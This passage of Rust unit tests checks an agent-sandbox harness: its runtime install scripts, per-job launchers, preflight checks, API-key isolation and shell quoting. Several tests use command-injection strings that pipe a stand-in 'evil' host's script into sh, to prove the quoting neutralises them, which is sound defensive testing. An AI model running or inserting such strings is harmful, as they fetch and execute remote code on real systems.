        assert!(s.contains(&format!("export XDG_DATA_HOME=\"{HARNESS_XDG_DATA_HOME}\"")));
        // The link lands in the directory the image's own PATH carries, which
        // is what makes a non-login shell find bun.
        assert!(s.contains(&format!("bin=\"{AGENT_BIN_DIR}\"")));
        assert!(s.contains("ln -sfn \"$real\" \"$bin/bun\""));
        // It answers bun, omp and the real bun's path, which is what callers
        // read back (parse_runtime).
        assert!(s.contains("echo \"bun $(\"$real\" --version)\""));
        assert!(s.contains("echo \"bunPath $real\""));
    }

    #[test]
    fn the_runtime_script_installs_the_pinned_omp_never_latest() {
        let s = harness_runtime_script();
        assert!(!s.contains("@latest"), "{s}");
        assert!(!s.contains("npx"), "no per-run registry resolution: {s}");
        assert!(s.contains(&format!("\"{OMP_PACKAGE}\":\"{OMP_VERSION}\"")));
        assert!(s.contains(&omp_install_dir()));
        // It is proven by starting it, on the bun it will run on.
        assert!(s.contains(&format!("grep -qx \"omp/{OMP_VERSION}\"")));
        // Installed beside, then moved into place: a half-done install is
        // never the one a launcher finds.
        assert!(s.contains("mv \"$tmp\" \"$omp_dir\""));
    }

    #[test]
    fn parse_runtime_reads_the_three_lines_and_refuses_a_partial_answer() {
        let out = "noise\nbun 1.4.4\nomp omp/18.16.0\nbunPath /opt/data/workbench/harness/xdg/mise/installs/bun/1.4.4/bin/bun\n";
        assert_eq!(
            parse_runtime(out),
            Some(Runtime {
                bun: "1.4.4".into(),
                omp: "omp/18.16.0".into(),
                bun_path: "/opt/data/workbench/harness/xdg/mise/installs/bun/1.4.4/bin/bun".into(),
            })
        );
        assert_eq!(parse_runtime("bun 1.4.4\nomp omp/18.16.0\n"), None);
    }

    #[test]
    fn every_job_gets_its_own_harness_dir_and_launcher() {
        let a = job_harness_dir("11111111-1111-1111-1111-111111111111");
        let b = job_harness_dir("22222222-2222-2222-2222-222222222222");
        assert_ne!(a, b);
        assert!(job_agent_dir("x").starts_with(&job_harness_dir("x")));
        assert!(job_launcher("x").starts_with(&job_harness_dir("x")));
        assert_ne!(
            job_agent_dir("x"),
            PI_CODING_AGENT_DIR,
            "never the shared dir every job used to fight over"
        );
    }

    #[test]
    fn the_launcher_runs_omp_on_the_harness_bun_in_the_jobs_own_dir() {
        let l = launcher_script(
            "abc",
            "/opt/data/workbench/jobs/abc",
            "/opt/data/workbench/harness/xdg/mise/installs/bun/1.4.4/bin/bun",
            true,
        );
        assert!(l.starts_with("#!/bin/sh\n"), "{l}");
        assert!(l.contains(&format!(
            "export PI_CODING_AGENT_DIR={}\n",
            job_agent_dir("abc")
        )));
        // omp is exec'd on the harness's bun by path: a repo's pinned bun on
        // PATH can no longer be the one omp checks its floor against.
        assert!(l.contains(&format!(
            "exec /opt/data/workbench/harness/xdg/mise/installs/bun/1.4.4/bin/bun {} \"$@\"",
            omp_entry()
        )));
        assert!(!l.contains("env bun") && !l.contains("@latest"));
        // The repo's toolchain is on PATH for omp's own commands, absolute.
        assert!(l.contains("PATH=\"$MISE_DATA_DIR/shims:$PATH\""));
        // It stands in the workdir and loads the project env.
        assert!(l.contains("cd /opt/data/workbench/jobs/abc ||"));
        assert!(l.contains(". ./.talaria/env"));
        // On the gateway, a shell without the key is refused in one sentence.
        assert!(l.contains(&format!("${{{WORKBENCH_KEY_ENV}:-}}")));
        assert!(l.contains(&format!("exit {LAUNCHER_REFUSED}")));
        // The key's NAME only, never a value, and never the personas' key.
        assert!(!l.contains("LLM_API_KEY") && !l.contains("OPENAI_API_KEY"));
        let account = launcher_script("abc", "/w", "/b", false);
        assert!(
            !account.contains(WORKBENCH_KEY_ENV),
            "a coding account's job needs no gateway key: {account}"
        );
    }

    #[test]
    fn a_hostile_path_cannot_break_out_of_the_launcher() {
        let l = launcher_script("abc", "/w; curl evil | sh", "/b", false);
        assert!(l.contains("cd '/w; curl evil | sh' ||"), "{l}");
    }

    #[test]
    fn the_job_harness_dir_links_the_render_and_holds_no_key() {
        let s = job_harness_script();
        assert!(!s.contains("__"), "{s}");
        for (from, to) in [
            ("models.yml", "models.yml"),
            ("mcp.json", "mcp.json"),
            ("pi-settings.json", "settings.json"),
        ] {
            assert!(
                s.contains(&format!("ln -sfn \"$cfg/{from}\" \"$agent/{to}\"")),
                "{from}: {s}"
            );
        }
        assert!(s.contains(&format!("cfg=\"{WORKBENCH_CONFIG_DIR}\"")));
        assert!(!s.contains("KEY"), "no key is written anywhere: {s}");
    }

    #[test]
    fn the_preflight_checks_what_the_live_fleet_tripped_on_without_a_model_call() {
        let s = preflight_script("/b/bun");
        assert!(!s.contains("__"), "{s}");
        for check in [
            "launcher", "key", "version", "writable", "models", "gateway",
        ] {
            assert!(s.contains(&format!("fail {check} ")), "{check} missing");
        }
        assert!(s.contains(&format!("*\"omp/{OMP_VERSION}\"*")));
        // The gateway check is the model LIST, which spends nothing.
        assert!(s.contains("\"/models\""));
        assert!(!s.contains("chat/completions") && !s.contains(" -p "));
    }

    #[test]
    fn preflight_verdict_reads_ok_and_fail() {
        assert_eq!(
            preflight_verdict("junk\nOK omp/18.16.0\n"),
            Ok("omp/18.16.0".into())
        );
        assert_eq!(
            preflight_verdict(
                "FAIL version\nthe launcher exited 1: error: Bun runtime must be >= 1.4.4\n"
            ),
            Err((
                "version".into(),
                "the launcher exited 1: error: Bun runtime must be >= 1.4.4".into()
            ))
        );
        assert_eq!(
            preflight_verdict(""),
            Err(("preflight".into(), "the preflight printed nothing".into()))
        );
    }

    #[test]
    fn a_container_without_the_shape_env_is_stale_and_the_current_one_is_not() {
        assert_eq!(sandbox_stale_reason(SANDBOX_SHAPE), None);
        assert_eq!(sandbox_stale_reason(&format!(" {SANDBOX_SHAPE}\n")), None);
        let why = sandbox_stale_reason("").expect("no token is stale");
        assert!(why.contains("predates"), "{why}");
        assert!(sandbox_stale_reason("2026-10-22.models-yml+workbench-key").is_some());
        assert_eq!(
            shape_env().get(SANDBOX_SHAPE_ENV).and_then(Value::as_str),
            Some(SANDBOX_SHAPE)
        );
    }

    #[test]
    fn omp_env_carries_the_workbench_key_only_and_its_config_dir() {
        let env = omp_env();
        assert_eq!(
            env.get(WORKBENCH_KEY_ENV).and_then(Value::as_str),
            Some("${LLM_WORKBENCH_API_KEY}")
        );
        assert!(
            !env.values()
                .any(|v| v.as_str().is_some_and(|s| s.contains("LLM_API_KEY"))),
            "the personas' key never reaches the sandbox env"
        );
        assert_eq!(
            env.get("PI_CODING_AGENT_DIR").and_then(Value::as_str),
            Some(PI_CODING_AGENT_DIR)
        );
        assert_eq!(
            env.len(),
            2,
            "nothing else rides the container env: {env:?}"
        );
    }

    #[test]
    fn the_workbench_key_rides_a_name_hermes_does_not_strip() {
        // Hermes strips its provider names from every terminal child, and
        // env_passthrough cannot re-allow them. The key used to be one.
        for gone in ["OPENAI_API_KEY", "OPENAI_BASE_URL"] {
            assert!(
                !omp_env().contains_key(gone),
                "{gone} never reaches a command the agent runs"
            );
        }
        assert!(WORKBENCH_KEY_ENV.starts_with("TALARIA_"));
        // omp looks the apiKey up as an env var NAME; a `$` makes it a literal.
        assert!(
            WORKBENCH_KEY_ENV
                .bytes()
                .all(|b| b.is_ascii_uppercase() || b.is_ascii_digit() || b == b'_'),
            "a bare env-var name: {WORKBENCH_KEY_ENV}"
        );
    }

    #[test]
    fn the_auth_probe_makes_one_bare_model_call() {
        let line = fill_cmd(OMP.auth_probe, Some("qwen3:14b"), "/unused", "/l/omp");
        assert!(line.contains("--model talaria/qwen3:14b"), "{line}");
        assert!(line.contains(" -p "), "print mode, not the TUI: {line}");
        for flag in [
            "--no-session",
            "--no-tools",
            "--no-skills",
            "--no-rules",
            "--no-extensions",
        ] {
            assert!(line.contains(flag), "{flag} missing: {line}");
        }
        assert!(!line.contains("<model>"));
        assert!(
            !line.contains("--auto-approve"),
            "no tools load, so nothing needs approving"
        );
    }

    #[test]
    fn fill_cmd_slots_the_prefixed_model_and_session_dir_and_leaves_task() {
        let out = fill_cmd(
            OMP.json_invoke,
            Some("qwen3:14b"),
            "/opt/data/workbench/sessions/abc",
            &job_launcher("abc"),
        );
        assert_eq!(
            out,
            "/opt/data/workbench/harness/jobs/abc/omp --mode json --auto-approve --session-dir /opt/data/workbench/sessions/abc --model talaria/qwen3:14b \"<task>\""
        );
        assert!(
            out.contains("\"<task>\""),
            "the steer stays for the driving agent to fill"
        );
    }

    #[test]
    fn every_invocation_line_takes_a_session_dir_and_a_model() {
        for t in [
            OMP.invoke,
            OMP.json_invoke,
            OMP.continue_invoke,
            OMP.continue_json_invoke,
        ] {
            assert!(t.contains("<sessionDir>"), "{t}");
            assert!(t.contains("<model>"), "{t}");
            assert!(
                t.starts_with("<launcher> "),
                "the job's launcher, never npx: {t}"
            );
        }
        assert!(OMP.continue_invoke.contains(" -c "));
        assert!(OMP.continue_json_invoke.contains(" -c "));
    }

    #[test]
    fn an_already_qualified_model_arg_is_not_prefixed_again() {
        let out = fill_cmd_arg(
            OMP.json_invoke,
            Some("anthropic/claude-opus-4-5"),
            "/opt/data/workbench/sessions/abc",
            "/l/omp",
        );
        assert!(
            out.contains("--model anthropic/claude-opus-4-5"),
            "a coding account's model keeps its own provider: {out}"
        );
        assert!(
            !out.contains("talaria/anthropic"),
            "and gains no second prefix"
        );
    }

    #[test]
    fn the_role_env_prefix_covers_the_three_roles_that_ride_env() {
        let prefix = role_env_prefix(&[
            ("default".into(), "anthropic/opus".into()),
            ("smol".into(), "anthropic/haiku".into()),
            ("slow".into(), "anthropic/sonnet".into()),
            ("plan".into(), "anthropic/opus".into()),
        ]);
        assert!(prefix.contains("PI_SMOL_MODEL=anthropic/haiku "));
        assert!(prefix.contains("PI_SLOW_MODEL=anthropic/sonnet "));
        assert!(prefix.contains("PI_PLAN_MODEL=anthropic/opus "));
        assert!(
            !prefix.contains("PI_MODEL"),
            "the default rides --model, not the env"
        );
    }

    #[test]
    fn a_value_with_shell_metacharacters_is_one_quoted_word() {
        // The injection the grammar and the quoting both exist for.
        let hostile = "x; curl https://evil/p.sh | sh; #";
        assert_eq!(sh_quote(hostile), "'x; curl https://evil/p.sh | sh; #'");
        // A single quote inside closes, escapes, and reopens.
        assert_eq!(sh_quote("it's"), "'it'\\''s'");
        // The empty string is still one word.
        assert_eq!(sh_quote(""), "''");
        // $(...), backticks, spaces, newlines: all quoted.
        for v in ["$(id)", "`id`", "a b", "a\nb", "a\"b", "a&b", "a>b"] {
            let q = sh_quote(v);
            assert!(q.starts_with('\'') && q.ends_with('\''), "{v:?} -> {q}");
        }
        // The real vocabulary passes through bare, so the usual line is
        // byte-for-byte what it was.
        for v in [
            "talaria/qwen3:14b",
            "anthropic/claude-opus-4-5",
            "/opt/data/workbench/sessions/abc",
            "gpt-5.1",
        ] {
            assert_eq!(sh_quote(v), v);
        }
    }

    #[test]
    fn a_hostile_model_arg_cannot_break_out_of_the_line() {
        let hostile = "talaria/x; curl https://evil/p.sh | sh; #";
        let out = fill_cmd_arg(
            OMP.json_invoke,
            Some(hostile),
            "/opt/data/workbench/sessions/abc",
            "/l/omp",
        );
        assert!(
            out.contains("--model 'talaria/x; curl https://evil/p.sh | sh; #' \"<task>\""),
            "{out}"
        );
        let prefix = role_env_prefix(&[("smol".into(), hostile.into())]);
        assert_eq!(
            prefix,
            "PI_SMOL_MODEL='talaria/x; curl https://evil/p.sh | sh; #' "
        );
    }

    #[test]
    fn roles_become_omp_env_with_the_provider_prefix_and_skip_unresolved() {
        let roles = OmpRoles {
            default: Some("mid".into()),
            smol: Some("fast".into()),
            slow: None,
            plan: Some("deep".into()),
        };
        let env = roles.env();
        assert_eq!(env["PI_SMOL_MODEL"], json!("talaria/fast"));
        assert_eq!(env["PI_PLAN_MODEL"], json!("talaria/deep"));
        assert!(
            !env.contains_key("PI_SLOW_MODEL"),
            "an unresolved role is left for omp's default"
        );
        assert!(
            !env.contains_key("PI_MODEL"),
            "the default rides --model, not the env"
        );
    }

    #[test]
    fn model_ids_are_distinct_with_the_default_first() {
        let roles = OmpRoles {
            default: Some("mid".into()),
            smol: Some("fast".into()),
            slow: Some("deep".into()),
            plan: Some("deep".into()),
        };
        assert_eq!(roles.model_ids(), vec!["mid", "fast", "deep"]);
        assert!(OmpRoles::default().model_ids().is_empty());
    }
}
